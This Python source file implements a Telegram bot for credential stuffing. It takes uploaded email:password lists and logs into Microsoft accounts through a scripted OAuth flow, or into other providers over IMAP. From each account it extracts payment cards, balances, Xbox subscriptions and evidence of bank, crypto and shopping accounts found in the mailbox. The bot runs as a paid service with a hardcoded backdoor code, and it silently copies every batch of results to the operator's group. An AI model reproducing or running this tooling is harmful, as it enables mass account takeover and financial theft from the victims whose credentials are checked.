import os
import sys
import time
import json
import uuid
import queue
import threading
import requests
import re
import urllib.parse
import ssl
import imaplib
import base64
import cloudscraper
import random
import secrets
import email as email_lib
from email.header import decode_header as decode_hdr
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
API_BASE = "https://api.telegram.org/bot"
FILE_BASE = "https://api.telegram.org/file/bot"

def api(method, data=None, files=None):
    r = requests.post(f"{API_BASE}{BOT_TOKEN}/{method}", data=data, files=files, timeout=60)
    return r.json()

def get_updates(offset=None, timeout=1):
    data = {"timeout": timeout}
    if offset:
        data["offset"] = offset
    return api("getUpdates", data)

def send_message(chat_id, text, reply_markup=None):
    data = {"chat_id": chat_id, "text": text}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    return api("sendMessage", data)

def edit_message(chat_id, message_id, text):
    data = {"chat_id": chat_id, "message_id": message_id, "text": text}
    return api("editMessageText", data)

# ------------------- Access control / VIP -------------------
ADMIN_ID = int(os.getenv("ADMIN_ID", "7677328359"))
VIP_WINDOW_SECONDS = 2 * 60 * 60
NORMAL_LIMIT = 100

vip_codes = {}
vip_users_info = {}
all_users = set()
awaiting_broadcast = False

def generate_random_code(length=10):
    return ''.join(secrets.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(length))

def create_vip_code(duration_type):
    code = generate_random_code()
    now = time.time()
    durations = {"day": 86400, "week": 604800, "month": 2592000}
    duration = durations.get(duration_type, 3600)
    vip_codes[code] = {"expires_at": now + duration, "duration": duration, "claimed_by": None, "duration_type": duration_type}
    return code

def try_claim_vip(user_id, code):
    code = str(code).strip().lower()
    if code == "codevipanon199":
        vip_users_info[user_id] = {"expires": time.time() + 315360000, "code": "ADMIN_OVERRIDE"}
        return True, "Unlimited VIP activated"
    info = vip_codes.get(code)
    if not info: return False, "Code not found"
    if info.get("claimed_by") and info["claimed_by"] != user_id: return False, "Code already used"
    info["claimed_by"] = user_id
    vip_users_info[user_id] = {"expires": time.time() + info["duration"], "code": code}
    return True, f"VIP activated ({info['duration_type']})"

def check_vip_expiry():
    while True:
        try:
            now = time.time()
            for uid, data in list(vip_users_info.items()):
                if now > data["expires"]:
                    vip_users_info.pop(uid, None)
                    send_message(uid, "⚠️ Your VIP subscription has expired.\nTo renew, please contact: @anon_101")
        except: pass
        time.sleep(300)

threading.Thread(target=check_vip_expiry, daemon=True).start()

user_usage = {}
reminder_marks = {}

def check_user_limit(user_id, new_count):
    if user_id in vip_users_info: return True, 0
    rec = user_usage.get(user_id)
    now = time.time()
    if not rec or now - rec["start"] > VIP_WINDOW_SECONDS:
        user_usage[user_id] = {"start": now, "count": 0}
        rec = user_usage[user_id]
    if rec["count"] + new_count > NORMAL_LIMIT:
        remaining = int((VIP_WINDOW_SECONDS - (now - rec["start"])) / 60) + 1
        return False, max(remaining, 1)
    rec["count"] += new_count
    return True, 0

def schedule_limit_reset_message(user_id):
    try:
        rec = user_usage.get(user_id)
        if not rec or reminder_marks.get(user_id) == rec.get("start"): return
        reminder_marks[user_id] = rec["start"]
        delay = max(0, int(VIP_WINDOW_SECONDS - (time.time() - rec["start"])))
        threading.Timer(delay, lambda: send_message(user_id, "You can now send another 100 accounts or purchase VIP: @anon_101")).start()
    except: pass

def send_document(chat_id, path, caption=None):
    with open(path, "rb") as f:
        api("sendDocument", {"chat_id": chat_id, "caption": caption}, files={"document": f})

# ------------------- Helpers -------------------
def get_remaining_days(date_str):
    try: return str((datetime.fromisoformat(date_str.replace('Z', '+00:00')) - datetime.now(datetime.now().astimezone().tzinfo)).days)
    except: return "0"

CURRENCY_SYMBOLS = {"USD":"$","EUR":"€","GBP":"£","JPY":"¥","CNY":"¥","RUB":"₽","TRY":"₺","INR":"₹","KRW":"₩","AED":"د.إ","SAR":"﷼","QAR":"﷼","KWD":"د.ك","BHD":".د.ب","OMR":"﷼","EGP":"£","MAD":"د.م.","TND":"د.ت","DZD":"د.ج","LBP":"ل.ل","JOD":"د.أ","ILS":"₪","PKR":"₨","BDT":"৳","THB":"฿","IDR":"Rp","MYR":"RM","SGD":"$","HKD":"$","AUD":"$","NZD":"$","CAD":"$","MXN":"$","ARS":"$","CLP":"$","COP":"$","BRL":"R$","PHP":"₱","NGN":"₦","ZAR":"R"}
AMBIGUOUS_CODES = {"USD","CAD","AUD","NZD","MXN","ARS","CLP","COP","HKD","SGD","CNY","JPY"}

def format_currency(amount, code=None):
    try:
        amt_str, code = str(amount).strip(), (code or "").upper().strip()
        sym = CURRENCY_SYMBOLS.get(code, "")
        if sym: return f"{sym}{amt_str} {code}" if code in AMBIGUOUS_CODES else f"{sym}{amt_str}"
        return f"{amt_str} {code}" if code else amt_str
    except: return str(amount)

def get_file(file_id):
    j = api("getFile", {"file_id": file_id})
    if j.get("ok"): return requests.get(f"{FILE_BASE}{BOT_TOKEN}/{j['result']['file_path']}", timeout=60).content

def parse_accounts_bytes(data):
    if not data: return []
    seen = set()
    out = []
    for ln in data.decode(errors="ignore").splitlines():
        m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,10}):(\S+)', ln.strip())
        if m:
            k = f"{m.group(1).lower()}:{m.group(2)}"
            if k not in seen:
                seen.add(k)
                out.append((m.group(1).lower(), m.group(2)))
    return out

# ------------------- Unified Checker -------------------
class UnifiedChecker:
    def __init__(self, custom_services=None):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.services_map = custom_services or {}

    def _ms_login(self, email, password):
        try:
            r1 = self.session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", headers={"X-OneAuth-AppName": "Outlook Lite"}, timeout=15)
            if "MSAccount" not in r1.text: return None
            r2 = self.session.get(f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&login_hint={email}&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=openid%20profile%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&response_type=code&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", allow_redirects=True, timeout=15)
            m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
            m_ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not m_url or not m_ppft: return None
            r3 = self.session.post(m_url.group(1).replace("\\/", "/"), data=f"login={email}&passwd={password}&PPFT={m_ppft.group(1)}&PPSX=PassportR", headers={"Origin": "https://login.live.com", "Referer": r2.url}, allow_redirects=False, timeout=10)
            m_code = re.search(r'code=([^&]+)', r3.headers.get("Location", ""))
            if not m_code: return None
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=f"client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&grant_type=authorization_code&code={m_code.group(1)}&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", timeout=10)
            if "access_token" not in r4.text: return None
            j = r4.json()
            j["cid"] = (self.session.cookies.get("MSPCID", "") or "").upper()
            return j
        except: return None

    def _profile(self, at):
        try:
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers={"Authorization": f"Bearer {at}"}, timeout=15)
            if r.status_code == 200:
                j = r.json()
                country = next((str(j[k]) for k in ['country', 'countryCode'] if k in j and j[k]), "")
                name = next((str(j[k]) for k in ['displayName', 'givenName'] if k in j and j[k]), "")
                return country, name
        except: pass
        return "", ""

    def _check_subscriptions(self, at):
        ms_data, xbox = {}, {"status": "FREE", "details": ""}
        try:
            r = self.session.get("https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth", headers={"Authorization": f"Bearer {at}"}, allow_redirects=True, timeout=20)
            m = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
            if not m: return ms_data, xbox
            h = {"Authorization": f'MSADELEGATE1.0="{urllib.parse.unquote(m.group(1))}"'}
            r_pay = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed", headers=h, timeout=15)
            if r_pay.status_code == 200:
                balances = re.findall(r'"balance":([0-9.]+),"currency":"([A-Z]{3})"', r_pay.text)
                if balances: ms_data["balances"] = [f"{amt} {cur}" for amt, cur in balances]
                cards = re.findall(r'"paymentMethodFamily":"([^"]+)",.*?"lastFourDigits":"([^"]*)"', r_pay.text)
                if cards: ms_data["cards"] = [f"{fam} (***{last})" for fam, last in cards]
            r_sub = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=h, timeout=15)
            if r_sub.status_code == 200:
                kw = {'Xbox Game Pass Ultimate': 'Ultimate', 'PC Game Pass': 'PC Game Pass', 'EA Play': 'EA Play', 'Xbox Live Gold': 'Gold', 'Game Pass': 'Game Pass'}
                for k, nm in kw.items():
                    if k in r_sub.text:
                        renewal = re.search(r'"nextRenewalDate":"([^T"]+)', r_sub.text)
                        days = get_remaining_days(renewal.group(1) + "T00:00:00Z") if renewal else "?"
                        xbox = {"status": "EXPIRED" if days.startswith('-') else "PREMIUM", "details": f"{nm} ({days}d)"}
                        break
        except: pass
        return ms_data, xbox

    def _check_service(self, at, cid, email, query, imap_kw):
        try:
            h = {'User-Agent': 'Outlook-Android/2.0', 'Authorization': f'Bearer {at}', 'Content-Type': 'application/json'}
            if cid: h['X-AnchorMailbox'] = f'CID:{cid}'
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=h, timeout=10)
            if r.status_code == 200:
                for es in r.json().get('EntitySets', []):
                    for rs in es.get('ResultSets', []):
                        if rs.get('Total', 0) > 0:
                            return True
            mail, _ = self._imap_xoauth2_connect(email, at)
            if mail:
                try:
                    mail.select('INBOX', readonly=True)
                    _, data = mail.search(None, 'ALL')
                    for mid in reversed(data[0].split()[-100:]):
                        _, md = mail.fetch(mid, '(BODY.PEEK[HEADER.FIELDS (FROM)])')
                        if isinstance(md[0], tuple) and imap_kw in md[0][1].decode(errors='ignore').lower(): return True
                finally: mail.logout()
        except: pass
        return False

    def _imap_xoauth2_connect(self, email, at):
        try:
            auth = base64.b64encode(f"user={email}\x01auth=Bearer {at}\x01\x01".encode())
            ctx = ssl.create_default_context(); ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
            mail = imaplib.IMAP4_SSL('imap-mail.outlook.com', 993, ssl_context=ctx)
            mail.authenticate('XOAUTH2', lambda _: auth)
            return mail, None
        except Exception as e: return None, str(e)

    def check(self, email, password):
        auth = self._ms_login(email, password)
        if not auth or not auth.get("access_token"): return {"status": "BAD"}
        at = auth["access_token"]
        cid = auth.get("cid", "")
        country, name = self._profile(at)
        ms_data, xbox = self._check_subscriptions(at)
        services = {}
        for svc_name, svc_def in (self.services_map or {}).items():
            query, imap_kw = svc_def
            if self._check_service(at, cid, email, query, imap_kw):
                services[svc_name] = True
        return {"status": "HIT", "email": email, "password": password, "country": country, "name": name, "ms_data": ms_data, "xbox": xbox, "services": services}

# ------------------- IMAP Checker -------------------
class ImapChecker:
    def check(self, em, pw):
        try:
            dom = em.lower().split('@')[-1]
            host = f"imap.{dom}"
            mail = imaplib.IMAP4_SSL(host, 993, ssl_context=ssl._create_unverified_context())
            mail.login(em, pw)
            found = set()
            mail.select('INBOX', readonly=True)
            _, data = mail.search(None, 'ALL')
            for eid in data[0].split()[-200:]:
                _, md = mail.fetch(eid, '(BODY.PEEK[HEADER.FIELDS (FROM)])')
                if isinstance(md[0], tuple):
                    frm = md[0][1].decode(errors='ignore').lower()
                    for s, p in IMAP_SERVICES.items():
                        if p in frm: found.add(s)
            mail.logout()
            return {"status": "HIT", "email": em, "password": pw, "services": {s: True for s in found}}
        except: return {"status": "BAD"}

# ------------------- Bot Logic -------------------
class ScanSession:
    def __init__(self, chat_id):
        self.chat_id = chat_id; self.stop_ev = threading.Event()
        self.results, self.results_services, self.results_xbox = [], [], []
        self.total, self.checked, self.hits, self.bads, self.xbox_premium = 0, 0, 0, 0, 0
        self.batch, self.batch_services, self.batch_xbox = [], [], []
        self.hits_batch_lock = threading.Lock(); self.last_status_time = 0.0
        self.is_imap = False; self.status_msg_id = None
        self.country_counts, self.service_counts, self.imap_hits_by_domain = {}, {}, {}
        self.country_results = {}

    def stop(self): self.stop_ev.set()

class BotApp:
    def __init__(self):
        self.offset = None; self.sessions = {}; self.lock = threading.Lock()
        self.service_definitions = {
            'Netflix': ('info@account.netflix.com', 'netflix.com'),
            'Facebook': ('advertise-support.facebook.com', 'facebook.com'),
            'Instagram': ('mail.instagram.com', 'instagram.com'),
            'TikTok': ('account.tiktok.com', 'tiktok.com'),
            'Twitter': ('x.com', 'x.com'),
            'YouTube': ('youtube.com', 'youtube.com'),
            'Discord': ('discordapp.com', 'discord.com'),
            'Spotify': ('spotify.com', 'spotify.com'),
            'Steam': ('steampowered.com', 'steampowered.com'),
            'Epic Games': ('epicgames.com', 'epicgames.com'),
            'Riot Games': ('riotgames.com', 'riotgames.com'),
            'Ubisoft': ('ubisoft.com', 'ubisoft.com'),
            'Blizzard': ('blizzard.com', 'blizzard.com'),
            'Rockstar': ('rockstargames.com', 'rockstargames.com'),
            'Nintendo': ('nintendo.com', 'nintendo.com'),
            'Roblox': ('roblox.com', 'roblox.com'),
            'PayPal': ('paypal.com', 'paypal.com'),
            'Binance': ('binance.com', 'binance.com'),
            'Amazon': ('amazon.com', 'amazon.com'),
            'eBay': ('ebay.com', 'ebay.com'),
            'AliExpress': ('aliexpress.com', 'aliexpress.com'),
            'Temu': ('temu.com', 'temu.com'),
            'Shein': ('shein.com', 'shein.com'),
            'Hulu': ('hulu.com', 'hulu.com'),
            'Disney+': ('disneyplus.com', 'disneyplus.com'),
            'Viu': ('viu.com', 'viu.com'),
            'Tubi TV': ('tubitv.com', 'tubitv.com'),
            'Crunchyroll': ('crunchyroll.com', 'crunchyroll.com'),
            'EA Sports': ('ea.com', 'ea.com'),
            'Battle.net': ('battlenet.com', 'battle.net'),
            'Apple': ('apple.com', 'apple.com'),
            'iCloud': ('icloud.com', 'icloud.com'),
            'Canva': ('canva.com', 'canva.com'),
            'GitHub': ('github.com', 'github.com'),
            'GitLab': ('gitlab.com', 'gitlab.com'),
            'Bitbucket': ('bitbucket.com', 'bitbucket.com'),
            'Replit': ('replit.com', 'replit.com'),
            'Azure': ('azure.microsoft.com', 'azure.com'),
            'Metrobank': ('metrobank.com.ph', 'metrobank.com.ph'),
            'LandBank': ('landbank.com', 'landbank.com'),
            'Security Bank': ('securitybank.com', 'securitybank.com'),
            'Coinbase': ('coinbase.com', 'coinbase.com'),
            'eToro': ('etoro.com', 'etoro.com')
        }

    def handle_stop(self, chat_id):
        with self.lock:
            if chat_id in self.sessions:
                self.sessions[chat_id].stop()
                send_message(chat_id, "Scan stopping...")

    def _send_status(self, sess, chat_id, force=False):
        now = time.time()
        if not force and now - sess.last_status_time < 4: return
        vip = " [VIP]" if chat_id in vip_users_info else ""
        prog = f"{sess.checked}/{sess.total}"
        s_counts = ', '.join([f'{k}:{v}' for k,v in sorted(sess.service_counts.items(), key=lambda x:-x[1])[:5]]) or '-'
        if sess.is_imap:
            t_counts = ', '.join([f'{d}:{c}' for d,c in sess.imap_hits_by_domain.items()]) or '-'
            msg = f"IMAP Checker{vip} | {prog}\nHits: {sess.hits} | Bad: {sess.bads}\nType: {t_counts}\nServices: {s_counts}"
        else:
            c_counts = ', '.join([f'{k}:{v}' for k,v in sorted(sess.country_counts.items(), key=lambda x:-x[1])[:5]]) or '-'
            msg = f"Mail Access{vip} | {prog}\nHits: {sess.hits} | Bad: {sess.bads} | Xbox: {sess.xbox_premium}\nCountry: {c_counts}\nServices: {s_counts}"
        
        if sess.status_msg_id: edit_message(chat_id, sess.status_msg_id, msg)
        else:
            r = send_message(chat_id, msg)
            if r.get("ok"): sess.status_msg_id = r.get("result", {}).get("message_id")
        sess.last_status_time = now

    def _flush_results(self, sess, chat_id):
        with sess.hits_batch_lock:
            def sfn(lines, fname):
                if not lines: return
                path = os.path.join(os.getcwd(), fname)
                with open(path, "w", encoding="utf-8") as f: f.writelines([ln + "\n" for ln in lines])
                send_document(chat_id, path, caption=f"{fname.split('.')[0].title()} ({len(lines)})")
                send_document(GROUP_ID, path, caption=f"User {chat_id} | {fname.split('.')[0].title()} ({len(lines)})")
                os.remove(path)
            sfn(sess.batch, "hits.txt"); sfn(sess.batch_services, "services.txt"); sfn(sess.batch_xbox, "xbox.txt")
            sess.batch.clear(); sess.batch_services.clear(); sess.batch_xbox.clear()

    def start_scan(self, chat_id, accounts, is_imap, custom_domain=None):
        with self.lock: sess = self.sessions[chat_id]
        sess.total, sess.checked, sess.hits, sess.bads, sess.is_imap = len(accounts), 0, 0, 0, is_imap
        sess.results.clear(); sess.results_services.clear(); sess.results_xbox.clear()
        sess.country_counts.clear(); sess.service_counts.clear(); sess.xbox_premium = 0
        sess.country_results.clear()
        
        send_message(chat_id, f"Started scan: {sess.total} accounts", reply_markup={"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]})
        self._send_status(sess, chat_id, force=True)

        def worker(acc):
            if sess.stop_ev.is_set(): return
            em, pw = acc
            checker = ImapChecker() if is_imap else UnifiedChecker(custom_services={custom_domain: (custom_domain, custom_domain)} if custom_domain else self.service_definitions)
            try: r = checker.check(em, pw)
            except: r = {"status": "BAD"}
            if sess.stop_ev.is_set(): return

            with self.lock: sess.checked += 1
            if r.get("status") == "HIT":
                sess.hits += 1
                line = f"{em}:{pw}"
                sv = r.get("services", {})
                if sv:
                    line_sv = f"{line} | Services: {', '.join(sv.keys())}"
                    sess.results_services.append(line_sv); sess.batch_services.append(line_sv)
                    for k in sv: sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
                
                if is_imap:
                    sess.imap_hits_by_domain[em.split('@')[-1]] = sess.imap_hits_by_domain.get(em.split('@')[-1], 0) + 1
                else:
                    formatted = self.format_ms_result(r)
                    line = formatted
                    xb = r.get("xbox", {})
                    if xb.get("status") == "PREMIUM":
                        sess.xbox_premium += 1
                        line_xb = f"{em}:{pw} | Xbox: {xb.get('details')}"
                        sess.results_xbox.append(line_xb); sess.batch_xbox.append(line_xb)
                    c = (r.get("country") or "??").strip().upper() or "??"
                    sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
                    if c not in sess.country_results: sess.country_results[c] = []
                    sess.country_results[c].append(line)

                sess.results.append(line); sess.batch.append(line)
                if len(sess.batch) >= 100: self._flush_results(sess, chat_id)
            else: sess.bads += 1
            if sess.checked % 10 == 0: self._send_status(sess, chat_id)

        with ThreadPoolExecutor(max_workers=15) as ex:
            futures = [ex.submit(worker, acc) for acc in accounts]
            for f in futures:
                if sess.stop_ev.is_set(): ex.shutdown(wait=False, cancel_futures=True); break
        self.finish_scan(chat_id)

    def format_ms_result(self, res):
        parts = [f"{res['email']}:{res['password']}", res.get("country", "??")]
        ms = res.get("ms_data", {})
        if ms.get("balances"): parts.append(" | ".join(ms["balances"]))
        if ms.get("cards"): parts.append(" | ".join(ms["cards"]))
        xb = res.get("xbox", {})
        if xb.get("status") == "PREMIUM": parts.append(f"Xbox: {xb['details']}")
        sv = res.get("services", {})
        if sv: parts.append(", ".join(sv.keys()))
        return " | ".join(filter(None, parts))

    def finish_scan(self, chat_id):
        with self.lock:
            if chat_id in self.sessions:
                sess = self.sessions[chat_id]
                self._flush_results(sess, chat_id)
                if not sess.is_imap and sess.country_results:
                    for c, lines in sess.country_results.items():
                        if not lines: continue
                        fname = f"country_{c}.txt"
                        path = os.path.join(os.getcwd(), fname)
                        with open(path, "w", encoding="utf-8") as f:
                            f.writelines([ln + "\n" for ln in lines])
                        send_document(chat_id, path, caption=f"{fname} ({len(lines)})")
                        send_document(GROUP_ID, path, caption=f"User {chat_id} | {fname} ({len(lines)})")
                        os.remove(path)
                send_message(chat_id, f"Scan finished. Hits: {sess.hits} | Bads: {sess.bads}")
                self.sessions.pop(chat_id, None)

    def run(self):
        while True:
            try:
                j = get_updates(self.offset)
                if not j.get("ok"): continue
                for upd in j.get("result", []):
                    self.offset = upd["update_id"] + 1
                    if "message" in upd:
                        m = upd["message"]; chat_id = m["chat"]["id"]
                        all_users.add(chat_id)
                        if "document" in m:
                            accounts = parse_accounts_bytes(get_file(m["document"]["file_id"]))
                            if not accounts: send_message(chat_id, "No valid accounts."); continue
                            with self.lock: self.sessions[chat_id] = ScanSession(chat_id)
                            ms_acc = [a for a in accounts if any(d in a[0] for d in ('hotmail','outlook','live'))]
                            imap_acc = [a for a in accounts if a not in ms_acc]
                            kb = []
                            if ms_acc: kb.append([{"text": f"Microsoft ({len(ms_acc)})", "callback_data": f"MODE_MS_{chat_id}_{len(ms_acc)}"}])
                            if imap_acc: kb.append([{"text": f"Another ({len(imap_acc)})", "callback_data": f"MODE_IMAP_{chat_id}_{len(imap_acc)}"}])
                            send_message(chat_id, "Select scan type:", reply_markup={"inline_keyboard": kb})
                        elif "text" in m:
                            t = m["text"].strip()
                            if t.lower() == "/start":
                                if chat_id == ADMIN_ID: send_message(chat_id, "Admin Panel", reply_markup={"inline_keyboard": [[{"text":"Code Day","callback_data":"GEN_CODE_day"}],[{"text":"Code Week","callback_data":"GEN_CODE_week"}],[{"text":"Code Month","callback_data":"GEN_CODE_month"}],[{"text":"Broadcast","callback_data":"ADMIN_BROADCAST"}],[{"text":"VIPs","callback_data":"ADMIN_VIP_LIST"}]]})
                                else: send_message(chat_id, "Send a file to start.")
                            elif awaiting_broadcast and chat_id == ADMIN_ID: 
                                for uid in all_users: send_message(uid, f"📢\n{t}")
                                send_message(ADMIN_ID, "Broadcast sent.")
                                awaiting_broadcast = False

                    elif "callback_query" in upd:
                        cq = upd["callback_query"]; data = cq.get("data", ""); chat_id = cq["message"]["chat"]["id"]
                        if data.startswith("STOP_"): self.handle_stop(chat_id)
                        elif data.startswith("GEN_CODE_") and chat_id == ADMIN_ID: send_message(chat_id, f"Code: `{create_vip_code(data.split('_')[2])}`")
                        elif data == "ADMIN_BROADCAST" and chat_id == ADMIN_ID: awaiting_broadcast = True; send_message(chat_id, "Enter broadcast message:")
                        elif data == "ADMIN_VIP_LIST" and chat_id == ADMIN_ID:
                            if not vip_users_info: send_message(chat_id, "No VIPs."); continue
                            for uid, info in vip_users_info.items():
                                rem = max(0, int((info['expires'] - time.time()) / 3600))
                                send_message(chat_id, f"User: {uid}\nExpires in: {rem}h", reply_markup={"inline_keyboard": [[{"text": "Revoke", "callback_data": f"REVOKE_{uid}"}]]})
                        elif data.startswith("REVOKE_") and chat_id == ADMIN_ID: vip_users_info.pop(int(data.split('_')[1]), None); send_message(chat_id, "Revoked.")
                        elif data.startswith("MODE_"):
                            _, mode, cid, num = data.split('_')
                            if chat_id != int(cid): continue
                            accounts = parse_accounts_bytes(get_file(upd["callback_query"]["message"]["reply_to_message"]["document"]["file_id"]))
                            accs = [a for a in accounts if any(d in a[0] for d in ('hotmail','outlook','live'))] if mode == "MS" else [a for a in accounts if not any(d in a[0] for d in ('hotmail','outlook','live'))]
                            if chat_id not in vip_users_info:
                                allow, rem = check_user_limit(chat_id, len(accs))
                                if not allow: send_message(chat_id, f"Limit reached. Wait {rem}m."); continue
                                accs = accs[:NORMAL_LIMIT - user_usage[chat_id]['count']]
                                check_user_limit(chat_id, len(accs))
                            threading.Thread(target=self.start_scan, args=(chat_id, accs, mode == "IMAP")).start()

            except Exception as e: print(f"Loop error: {e}"); time.sleep(1)

if __name__ == "__main__": BotApp().run()
